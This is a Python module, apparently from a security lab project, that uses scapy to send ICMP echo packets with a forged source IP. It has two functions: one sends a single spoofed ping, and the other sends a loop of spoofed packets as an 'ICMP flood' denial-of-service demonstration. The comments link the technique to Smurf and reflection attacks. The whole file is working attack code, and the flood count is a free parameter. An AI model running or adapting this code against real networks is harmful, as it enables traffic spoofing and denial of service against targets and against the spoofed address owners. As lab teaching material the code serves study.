# ============================================================
# FILE: spoofer/icmp_spoofer.py
# PURPOSE: Creates and sends fake ICMP packets with forged source IP
# WHY NEEDED: ICMP spoofing is a DIFFERENT attack vector from TCP.
#             ICMP is the protocol used by "ping" commands.
#             By spoofing ICMP packets we demonstrate:
#             1. How attackers fake ping requests
#             2. How ICMP flood attacks work (basic DoS concept)
#             3. How network diagnostic tools can be abused
#             Kept separate from ip_spoofer.py because ICMP and TCP
#             serve completely different purposes and the attacks
#             are used in different real-world scenarios.
# ============================================================

from scapy.all import IP, ICMP, send
# IP   → build IP layer with fake source
# ICMP → build ICMP layer (ping packet)
# send → transmit the crafted packet

from utils.helpers import log_packet, print_separator

def send_fake_ping(fake_src_ip, target_ip):
    # --------------------------------------------------------
    # FAKE ICMP PING
    # Normal ping: Your_Real_IP → Target
    # Spoofed ping: Fake_IP → Target
    # Target replies to the FAKE IP, not you
    # This is used in Smurf attacks and reflection attacks
    # --------------------------------------------------------
    
    print_separator()
    log_packet("Sending Fake ICMP Ping (Spoofed)")
    print(f"  Fake Source IP : {fake_src_ip}")
    print(f"  Target IP      : {target_ip}")
    print(f"  [!] Wireshark filter: icmp")
    # Simple Wireshark filter to see all ICMP traffic

    packet = IP(src=fake_src_ip, dst=target_ip) / ICMP()
    # IP(src=fake_src_ip) → forged source IP
    # ICMP()              → default ICMP echo request (ping)
    # "/"                 → stack IP and ICMP layers together
    
    send(packet, verbose=False)
    log_packet(f"Fake ICMP packet sent to {target_ip}")


def send_icmp_flood(fake_src_ip, target_ip, count=10):
    # --------------------------------------------------------
    # ICMP FLOOD (Basic DoS Demonstration)
    # Sends many ICMP packets rapidly to overwhelm target
    # Demonstrates concept of Denial of Service (DoS) attacks
    # In real attacks, count would be thousands/millions
    # We use small count (10) for safe lab demonstration
    # --------------------------------------------------------
    
    print_separator()
    log_packet(f"Sending ICMP Flood — {count} packets")
    print(f"  [!] Wireshark filter: icmp && ip.src=={fake_src_ip}")
    # More specific Wireshark filter to see only our spoofed packets

    for i in range(count):
        # Loop sends 'count' number of packets one by one
        packet = IP(src=fake_src_ip, dst=target_ip) / ICMP()
        # Same spoofed ICMP packet built fresh each iteration
        send(packet, verbose=False)
        print(f"  Packet {i+1}/{count} sent to {target_ip}")
        # Progress counter so we can see packets being sent
        # This also appears in Wireshark in real time

    log_packet("ICMP Flood complete.")